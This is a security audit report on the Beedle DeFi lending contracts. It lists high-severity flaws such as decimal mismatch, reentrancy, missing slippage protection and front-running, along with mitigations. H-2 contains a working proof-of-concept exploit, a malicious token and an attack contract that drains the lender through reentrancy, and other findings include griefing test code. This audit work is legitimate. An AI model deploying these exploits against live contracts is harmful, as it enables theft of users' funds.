# High 

### [H-1]: `Beedle::Lender.sol` incorrectly calculates the `loanRatio` which can lead to losses

**Description:** Due to decimals mismatching an issue stems out which leads to incorrect calculation of `loanRatio`. This allows users to borrows more than intended due to decimal mismatch.

```solidity
    uint256 loanRatio = (debt * 10 ** 18) / collateral;
```

<b>Instances:</b>

<https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232-L287>

<https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L355-L432>

<https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591-L710>


**Impact:** Since, user can provide less collateral but he's able to borrow more tokens than the collateral it can lead to significant loss of funds.

**Recommended Mitigations:**

Make sure to scale debt and collateral based on the token decimals in order to calculate properly the `loanRatio`. This can be easily done by changing the loanRatio calculation as follows:

```solidity
  uint256 loanRatio = ((debt * (10**(18 - loanToken.decimals()))) * 10 ** 18) / (collateral * (10 ** (18 - collateralToken.decimals())));
```

### [H-2] `Beedle::Lender.sol` can be drained due to Rentrancy in `repay` function

**Description:** Since, its is not defined which token to use as loan/collateral, anyone can use any token as loan/Collateral. An attacker can create an `ERC-777` token allowing reentrant calls on transfer to drain any token from the `Lender` contract. The `Lender` contract allows any token as `loanToken` and the `repay` function transfers the tokens before deleting the loan which result in a re-entrancy vulnerability.

```solidity
	// transfer the loan tokens from the borrower to the pool
            IERC20(loan.loanToken).transferFrom( // @audit - Re-entrancy can drain contract
                msg.sender,
                address(this),
                loan.debt + lenderInterest
            );
            // transfer the protocol fee to the fee receiver
            IERC20(loan.loanToken).transferFrom(
                msg.sender,
                feeReceiver,
                protocolInterest
            );
            // transfer the collateral tokens from the contract to the borrower
            IERC20(loan.collateralToken).transfer(
                loan.borrower,
                loan.collateral
            );
            emit Repaid(
                msg.sender,
                loan.lender,
                loanId,
                loan.debt,
                loan.collateral,
                loan.interestRate,
                loan.startTimestamp
            );
            // delete the loan
@>            delete loans[loanId];
        }
```

**Impact:** User's can claim collateral more than once, which will lead to losses.

**Proof Of Code:**

File: ExploitToken.sol

```solidity
//SPDX-License-Indeitifer:MIT
pragma solidity ^0.8.16;

import {ERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";


contract ExploitToken is ERC20{

address owner;
    constructor(uint256 amount)ERC20("ExploitToken","ET"){
            owner = msg.sender;
            _mint(msg.sender, amount);
    }

    // This function overrides _afterTokenTransfer, a virtual function in the OpenZeppelin ERC20 contract.
    // It executes after every token transfer (transfer, transferFrom, or _mint). This hook will execute on all toke transfers
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        (bool status,) = owner.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        require(status, "call failed");
    }
} 
```

File: Exploit7.sol

```solidity
//SPDX-License-Identifer: MIT
pragma solidity ^0.8.16;

import {ExploitToken} from "../src/ExploitToken.sol";
import {ERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../src/utils/Structs.sol";
import "../src/Lender.sol";

contract Exploit7{  

    Lender lender;
    bool loanBorrowed;
    uint256 i;
    address collateralToken;
    ExploitToken exploitToken;

    constructor(Lender _lender, address _collateralToken){
        lender=_lender;
        collateralToken=_collateralToken;
    }

    function attack(address _collateralToken) external{
        ERC20(_collateralToken).approve(address(lender), type(uint256).max);
        exploitToken = new ExploitToken(1_000_000_000*10*18);
        ERC20(exploitToken).approve(address(lender), type(uint256).max);

        Pool memory pool = Pool({
            lender: address(this),
            loanToken: address(exploitToken),
            collateralToken: _collateralToken,
            minLoanSize: 1,
            poolBalance: 1_000_000*10*18,
            maxLoanRatio: type(uint256).max,
            auctionLength: 1 days,
            interestRate: 0,
            outstandingLoans: 0
        });

        bytes32 poolId = lender.setPool(pool);

        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 1,
            collateral: 1_000*10**18
        });

        Borrow[] memory borrows = new Borrow[](1);

        borrows[0] = b;        

        lender.borrow(borrows);

        // (4) Take another loan of exploitTokens to increase poolBalance

        b = Borrow({
            poolId: poolId,
            debt: 1_000,
            collateral: 1
        });

        borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        loanBorrowed = true;

        // (5) Repay the loan
        uint256 loanId = 0;
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = loanId;
        lender.repay(loanIds);
        // (7) Send the funds back to the attacker
        ERC20(_collateralToken).transfer(msg.sender, ERC20(_collateralToken).balanceOf(address(this)));   
    }

    function tokensReceived(address from, address to, uint256 /*amount*/) external {
        if (msg.sender == address(exploitToken)) {
            if (from == address(this) && to == address(lender) && loanBorrowed) {
                // (6) Re-enter the `repay` function (10 times for POC); 
                if (i < 10) {
                    i = i + 1;                    
                    uint256 loanId = 0;
                    uint256[] memory loanIds = new uint256[](1);
                    loanIds[0] = loanId;
                    lender.repay(loanIds);
                }          
            }
        }        
    }
}
```
File: Lender.t.sol

Add the below test to file:

```solidity
unction test_exploit7() public {
	address attacker = address(0x5);
	// Setup
	collateralToken.transfer(address(lender), 10_000*10**18);
	collateralToken.transfer(address(attacker), 1_000*10**18 + 1); 

	// Before the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 10_000*10**18);  // Lender contract has 10_000 collateralToken
	assertEq(collateralToken.balanceOf(address(attacker)), 1_000*10**18 + 1); // Attacker has 1_000 collateralToken

	// Exploit starts here
	vm.startPrank(attacker); // Attacker wants to drain all collateralTokens from the contract        
	Exploit7 attackContract = new Exploit7(lender, address(collateralToken));
	collateralToken.transfer(address(attackContract), 1_000*10**18 + 1);
	attackContract.attack(address(collateralToken));

	// After the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 1);               // Lender contract has been drained (1 wei left)
	assertEq(collateralToken.balanceOf(address(attacker)), 11_000*10**18); // Attacker has stolen all the 10_000 collateralToken
}

```

**Recommended Mitigations:** Always follow the:> Checks - Effect - Interactions CEI) pattern

### [H-3] `Beedle::Fees.sol` lacks slippage protection

**Description:** The `Fees::sellProfits()` functions lacks slippage protection, the `amountOutMinimum` and `sqrtPriceLimitX96` are set to `0` when swapping in uniswap pools this makes the user vulnerable to price manipulation attacks, and user will end getting very less or no tokens. 

```solidity
function sellProfits(address _profits) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
@>                amountOutMinimum: 0, 
@>                sqrtPriceLimitX96: 0 
            });

        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
}

```

**Impact:** When swapping tokens user can end up with very less or losing up all of the tokens.

**Recommended Mitigations:**
Specify `amountOutMinimum` with some value instead of zero and if necessary, specify the `sqrtPriceLimitX96` parameter to set a stop price.


### [H-4] Missing checks in `buyLoan` function 

**Description:** The `buyLoan` function is not having any check for `minLoanSize` and `maxLoanRatio`. The problem is when there is no `maxloanRatio` check,  malicious actors can take advantage of this by buying a loan after an auction is started for very less collateral and can borrow a huge loan.

**Proof Of Code**:

1. User create a pool with very high interest lets say maximum interest.
2. From another wallet, the same user takes a borrow for 1000 USDC and gives 3000 USDT as collateral
3. User A calls startAuction for this loan. User B sees the loan on auction and since it has high interest rate and is well-collateralized, decides to buy it. User B calls buyLoan and passes to corresponding loanId.
4. User sees the pending transaction and front-runs it and changes his pool.maxLoanRatio to type(uint256).max (basically allowing for loans not sufficiently backed up by collateral)
5. After changing the maxLoanRatio, user A calls refinance and sets the loan debt to user B's pool balance and changes the collateral to 1 USDT.
6. After doing so, user A changes maxLoanRatio back to its original value and once again calls startAuction with the same loanId.
7. Considering steps 6-8 all executed before user B's buyLoan, user B's call now executes and they've bought a borrow for all of their pool balance, backed up by pretty much no collateral.
8. User A successfully executed the attack and has now taken a huge borrow which they have no incentive to repay as there isn't any valuable collateral attached to it.
9. User A can then either withdraw their funds from their pool or repeat the attack. 

**Impact:** Users will end up losing there funds

**Recommended Mitigations:** 

Add the below check:

```solidity
+        uint256 loanRatio = (totalDebt * 10 ** 18) / loan.collateral;
+        if (loanRatio > pools[poolId].maxLoanRatio) revert RatioTooHigh();
```

### [H-4] Missing `msg.sender` check in `buyLoan` function 

**Description:** Due to insufficient checks in `buyLoan` function, it allows malicious actors to buy loan from auction by passing a `poolId` that they don't own (i.e is they are not the lender of the pool). As a result, the function incorrectly updates the loan's ownership to the malicious actor's address without requiring any collateral transfer.

The malicious actor identifies a loan in the auction and decides to purchase it. Using the `buyLoan` function, the malicious actor passes a `poolId` that they do not own and also may not Have the same loanTokens and collateralTokens ,since there are no checks for mismatching tokens which gives the malicious actor a lot of choice from pools. As a result, the function updates the loan ownership to the malicious actor's address while taking the debt from the pool provided by the malicious actor.

**Proof Of Code:**

********************************

**Impact:** Loan is permanently bricked and can never be repaid as attacker has become loan.lender.

**Recommended Mitigations:**

1. Lender.buyLoan() can validate that msg.sender is the pool's lender. This would stop anyone from matching an auctioned loan with a pool, so according to the system design this is not a great option,
2. Change [L518](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L518) to set loans\[loanId].lender to pools\[poolId].lender instead of msg.sender. This preserves the system design that anyone can match an auctioned loan with a pool so this is the better option.

### [H-5] Revert on `Beedle::Fees::sellProfits` function

**Description:** In the `Beedle::Fees::sellProfits` function token are not approved to be spent by the uniswap router. This will cause any call to `sellProfits` to always revert upon calling and will results in all tokens sent to the contract to be locked forever.

```solidity
	amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
```

**Impact:** This issue will make any ERC20 tokens sent to be contract to be permanently frozen in the contract.

**Recommended step:**

Add the below line to the code:

```solidity
    IERC20(_profits).approve(address(swapRouter), IERC20(_profits).balanceOf(address(this)))
    amount = swapRouter.exactInputSingle(params);
    IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
```

### [H-6] Borrows can prevent the loans from being liquidated 

**Description:** `Lender.buyLoan()` doesn't check if the poolId parameter is the same pool that has auctioned the loan. An attacker can use Lender.buyLoan() to grief the selling pool by stopping the auction via buying the auctioned loan back to the same pool. This also reduces that pool's balance and increases that pool's outstanding loans, negatively impacting the pool's financials.

**Impact:** Attacker can grief any auction stopping it at will by buying the auctioned loan back to the originating pool. This also decreases the pool's balance & increases the pool's outstanding loans, hurting the pool financially.

**Proof Of Code:**

Add these to functions to `Lender.sol`:

```solidity
// added for audit contest proof of concept
function getPoolBalance(bytes32 poolId) external view returns(uint256 poolBalance) {
	return pools[poolId].poolBalance;
}
// added for audit contest proof of concept
function getPoolOutstandingLoans(bytes32 poolId) external view returns(uint256 outstandingLoans) {
	return pools[poolId].outstandingLoans;
}
```

Then add the test to `test/Lender.t.sol`:

```solidity
function test_attackerGriefBuyLoanToSellingPool() public {
	// using modified setup from test_buyLoan()
	test_borrow();
	// accrue interest
	vm.warp(block.timestamp + 364 days + 12 hours);

	// find the poolId which will auction the loan
	bytes32 poolId = lender.getPoolId(lender1, address(loanToken), address(collateralToken));

	// record the pool's balance & outstanding loans before the auction & exploit
	uint256 poolBalanceBefore = lender.getPoolBalance(poolId);
	uint256 poolOustandingLoansBefore = lender.getPoolOutstandingLoans(poolId);

	// kick off auction
	vm.startPrank(lender1);

	uint256[] memory loanIds = new uint256[](1);
	loanIds[0] = 0;

	lender.startAuction(loanIds);

	// warp to middle of auction
	vm.warp(block.timestamp + 12 hours);

	// stop lender1 prank
	vm.stopPrank();

	// attacker is not a lender & has no pool but can
	// call Lender.buyLoan() to force selling pool to buy their own loan
	// this will grief the auction as the attacker can always stop an auction
	// by forcing the selling pool to buy back its own loan
	address attacker = address(0x1337);
	vm.prank(attacker);
	lender.buyLoan(loanIds[0], poolId);

	// record the pool's balance & outstanding loans after the exploit
	uint256 poolBalanceAfter = lender.getPoolBalance(poolId);
	uint256 poolOustandingLoansAfter = lender.getPoolOutstandingLoans(poolId);

	console.log("poolBalanceBefore         : ", poolBalanceBefore);
	console.log("poolBalanceAfter          : ", poolBalanceAfter);
	console.log("poolOustandingLoansBefore : ", poolOustandingLoansBefore);
	console.log("poolOustandingLoansAfter  : ", poolOustandingLoansAfter);

	// this attack negatively impacts the pool's balance & oustanding loans:
	// pool balance is reduced after the attack
	assert(poolBalanceAfter < poolBalanceBefore);
	// pool outstanding loan is increased after the attack 
	assert(poolOustandingLoansAfter > poolOustandingLoansBefore);
}
```

**Recommended Mitigations:**

Lender.buyLoan() must check poolId parameter does not match the selling poolId.

### [H-7] Allowing the borrower to maintain control of their collateral indefinitely without resolving the debt.

**Description:** The identified issue is that the borrower can grief an auction by repeatedly refinancing their `loan within the same pool`, resetting the loan's auction timeline and preventing their collateral from being seized.

The function allows refinnacing to the same pool, never checks that the loan being refinnaced currently is auctioned or not and resets `loan.auctionStartTimestamp` effectively cancelling any auction.

```solidity
loans[loanId].auctionStartTimestamp = type(uint256).max;
loans[loanId].auctionLength = pool.auctionLength;
```
By refinancing back into the same pool, these parameters are reset, effectively stopping any ongoing liquidation auction.

**Proof Of Code:**

```solidity
function test_borrowerGriefAuctionViaRefinance() public{
    test_borrow();

    // accrue interest
	vm.warp(block.timestamp + 364 days + 12 hours);

	// find the poolId which will auction the loan
	bytes32 poolId = lender.getPoolId(lender1, address(loanToken), address(collateralToken));

	// kick off auction
	vm.startPrank(lender1);

    uint256[] memory loanIds = new uint256[](1);
	loanIds[0] = 0;

	lender.startAuction(loanIds);
	vm.stopPrank();

	// attacker is the borrower who wants to prevent their
	// loan from being auctioned, can stop the auction by
	// refinancing back into the same pool. They can do this
	// as soon as the auction is launched to prevent their
	// collateral from ever being seized
	vm.startPrank(borrower);

    // prepare the payload
	Refinance memory r = Refinance({
		loanId: 0,
		poolId: poolId,
		debt: 100*10**18,
		collateral: 100*10**18
	});
	Refinance[] memory rs = new Refinance[](1);
	rs[0] = r;

	lender.refinance(rs);
    vm.stopPrank();
    // verify that a buyer can't buy the auctioned loan
	address buyer = address(0x1234);
	vm.prank(buyer);
	vm.expectRevert();
	// will revert AuctionNotStarted
	lender.buyLoan(loanIds[0], poolId);

}
```

**Impact:** A hostile borrower who never intends on repaying their loan can use this exploit to prevent their collateral from ever being seized, since the only way to seize collateral is to run an auction & have that auction finish without any buyers. This results in a lender never being able to collect payment or seize the collateral; the borrower can maintain the loan indefinitely by using this exploit to immediately stop any auction of their loan.

**Recommended Mitigations:** Implement checks to find out that loan that is being auctioned cannot be refinnaced at the same time.

### [H-8] Debt is substracted twice from the pool

**Description:** The `refinance` function allows borrowers to move there loan to another pool under new lending conditions. The issue arises because the new pool's poolBalance is reduced twice during the refinance() function.

In refinance() the debt to the new pool is transferred at line 636:

```solidity
	_updatePoolBalance(poolId, pools[poolId].poolBalance - debt);
```

The debt is subtracted again at line 696:

```solidity
     	pools[poolId].poolBalance -= debt;
```

**Impact:** Pool balances are reduced twice by the transferred debt. The larger the loan the greater the loss of funds to the new pool.

**Recommended Mitigations:** 

Only implement the line:

```solidity
     	pools[poolId].poolBalance -= debt;
```

### [H-9] `Beedle::Lender.sol` doesn't account for `Rebasing`, `Inflationary`, `Deflationary` and `Fee on Transfer` tokens

**Description:** 

The current implementation of the `Lender` contract does not handle these kinds of tokens:

* Rebasing tokens
* Inflationary tokens
* Deflationary tokens
* Tokens with fee-on-transfer

The accounting variables on the `Loan` and `Pool` structs will store an incorrect value that could lead to reverts or further accounting errors.

**Impact:** Since, the above token behaviours are not taken into account when performing calculation it can result in accounting errors or reverts.

**Recommended Mitigations:**

The protocol should choose one of the following options:

1. Have a list of whitelisted collateral and lending tokens that can be used
2. Correctly account the real amount that has been deposited to the `Lender` contract or from the `Lender` contract after the transfer has happened

### [H-10] `Borrow` and `Refinance` can be front-runned by the `Lender` leading to setting of unfavourable pool conditions

**Description:**

If a user/borrower calls the `borrow` or `refinance` functions, the pool lender can front-run and change the pool's `auctionLength` to an unfavorable (for the borrower) and very small value (e.g., `1`) by using the `setPool` function. Subsequently, the lender of the pool can start the auction for the loan. Due to the short `auctionLength`, the auction will end early. This allows the lender (or basically anyone) to seize the collateral in the next block.

* The `borrow` function assigns the `pool.auctionLength` to the loan in [L259](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L259)
* The `refinance` function updates the loan's auction length to the `pool.auctionLength` in [L694](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L694)

Another, problem is that the borrower can be frontrunned by a malicious lender changing the pool interest or a legitimate lender can change his pool interests while the `refinance()` function is executing making the borrower to take non-agreed interest by chance. Please see the next scenario:

1. Borrower calls the `refinance()` function because he wants to transfer his debt to a pool which has a 0.01% interest rate.
2. Legitimate lender just change his pool interests to 0.3% using the [updateInterestRate()](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L221) function. This function is executed before the `step1` because the lender pay more gas.
3. The `refinance()` transaction is now executed but the pool interest has increased, now the borrower [end up with a different pool interest](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L688) (`0.3%`).


**Impact:** This can lead huge losses for borrowers

**Recomended Mitigations:**

Add a validation in the `refinance()` function which helps the borrower to specify the interest he is allowed to pay:

Consider allowing the borrower to define a minimum auction length when borrowing or refinancing and validate if the pool fulfills this criterion. Additionally, consider adding a reasonable minimum value for the auction length (e.g., 1 hour or 1 day) to allow the borrower to act appropriately.

### [H-11] In `Beedle::Fees` contract router address is hardcoded which can lead to loss of funds

**Description:** This audit report provides an assessment of the contract containing the hardcoded router address for token swaps. The router address is set to "0xE592427A0AEce92De3Edee1F18E0157C05861564" and refers to a specific instance of ISwapRouter. The hardcoded router address can cause issues when deployed on networks where this address does not correspond to the appropriate Uniswap router. 

```solidity

    /// uniswap v3 router
    ISwapRouter public constant swapRouter =
        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
```

**Impact:** Tokens may become locked in the protocol indefinitely, preventing withdrawals and potentially leading to financial losses.

**Recommended Mitigations:**

Avoid using hardcoded values, instead use something like this:

```solidity
constructor(address _swapRouter) {
    require(_swapRouter != address(0), "Invalid router address");
    swapRouter = ISwapRouter(_swapRouter);
}
```

# Medium 

# Low
